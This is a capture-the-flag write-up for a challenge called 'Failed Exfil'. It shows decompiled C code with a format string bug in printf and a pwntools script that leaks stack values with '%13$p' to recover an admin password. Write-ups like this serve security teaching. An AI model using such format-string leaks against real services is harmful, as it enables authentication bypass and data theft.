# Write-up of the challenge "Failed Exfil"

This challenge is part of the **"Binary exploitation"** category and earns 134 points.

# Goal of the challenge
So the goal of this challenge is to find the correct password for the admin.

# Program structure

```c
int64_t parse_command(char* arg1)
{
    if (!strncmp(arg1, "write", 5))
        return 1;
    
    if (!strncmp(arg1, "read", 4))
        return 2;
    
    if (!strncmp(arg1, "admin", 5))
        return 3;
    
    if (strncmp(arg1, "quit", 4))
        return 0;
    
    return 4;
}

char* handle_write()
{
    printf("data: ");
    char* result = fgets(&collected_data, 0x400, stdin);
    
    if (!result)
        return result;
    
    return puts("ok");
}

int64_t handle_read()
{
    puts("data:");
    return printf(&collected_data);
}

char* handle_admin(int32_t arg1)
{
    printf("auth: ");
    char var_118[0x10c];
    char* result = fgets(&var_118, 0x100, stdin);
    
    if (!result)
        return result;
    
    if (strtoul(&var_118, nullptr, 0xa) != arg1)
        return puts("denied");
    
    return puts(&metadata);
}

int32_t main(int32_t argc, char** argv, char** envp)
{
    init();
    srand(time(nullptr));
    int32_t rax_1 = rand();
    
    while (true)
    {
        printf("cmd: ");
        char buf[0x2c];
        char* rax_3 = fgets(&buf, 0x20, stdin);
        int32_t rax_4;
        
        if (rax_3)
            rax_4 = parse_command(&buf);
        
        if (!rax_3 || rax_4 == 4)
            return 0;
        
        if (rax_4 == 3)
        {
            handle_admin(rax_1);
            continue;
        }
        else if (rax_4 == 1)
        {
            handle_write();
            continue;
        }
        else if (rax_4 == 2)
        {
            handle_read();
            continue;
        }
        
        puts("?");
    }
}

```

# Problem
So the problem I faced is that I thought we literally had no source code to work with. Because all we got was this:

<img src="./telegram.png"/>

So after trying to work on the remote host of the challenge by guessing, I've had enough and tried to look for clues that's when I saw the url in the image **https://files.vipin.xyz/api/public/dl/O7P9bC9P/advent-of-ctf-csd/2025/day%207/collector**.

That gave me the binary that made me solve the problem!


# Vulnerability

The vulnerability is **format string attack**: 
```c
int64_t handle_read()
{
    puts("data:");
    return printf(&collected_data);
}
```

## Solution

So my solution was to basically use the **write option** and put bunch of **%p** inside the data section, that will leak data off the stack. We later get a hint that 
```
The secret code sits inside those eight bytes, just not in the position you might expect. Try isolating the upper four bytes of the leaked value, interpret them as a standalone integer, then convert them to decimal. Tools like CyberChef make this extraction extremely simple.
```

So the password for admin is generated using **Srand** so everytime we disconnect from the remote host the password get's reseted. So in different runs I tried to take the first 4 bytes **from different hex leak** and then convert them **to decimal**. It did it all the way from **%1$p** to **%13$p** and that was the admin password. So we just write **admin** and then that password, but I did a solve.py script because it is more conventient for me:


```python
#!/usr/bin/env python3
from pwn import *

def solve_pow(conn):
    conn.recvuntil(b'proof of work:\n')
    pow_line = conn.recvline().decode().strip()
    print("POW line:", pow_line)
    solution = input("Paste solution: ").strip()
    conn.sendlineafter(b'solution: ', solution.encode())

def get_secret(p):
    p.sendline(b'write')
    p.recvuntil(b'data: ')
    p.sendline(b'%13$p')
    p.recvuntil(b'ok\n')
    p.sendline(b'read')
    p.recvuntil(b'data:\n')
    leak = p.recvline().decode().strip()
    print(f"Leak: {leak}")
    
    # Extract upper 4 bytes
    hex_part = leak[2:]  # remove '0x'
    if len(hex_part) < 8:
        hex_part = hex_part.zfill(8)
    secret = int(hex_part[:8], 16)
    return secret

def main():
    p = remote('ctf.csd.lol', 7777)
    solve_pow(p)
    p.recvuntil(b'cmd: ')
    
    secret = get_secret(p)
    print(f"Secret: {secret}")
    
    p.sendline(b'admin')
    p.recvuntil(b'auth: ')
    p.sendline(str(secret).encode())
    
    p.recvuntil(b'# KRAMPUS SYNDICATE EXFIL v1.4\n')
    print(p.recvuntil(b'}').decode())
    
    p.close()

if __name__ == '__main__':
    main()

```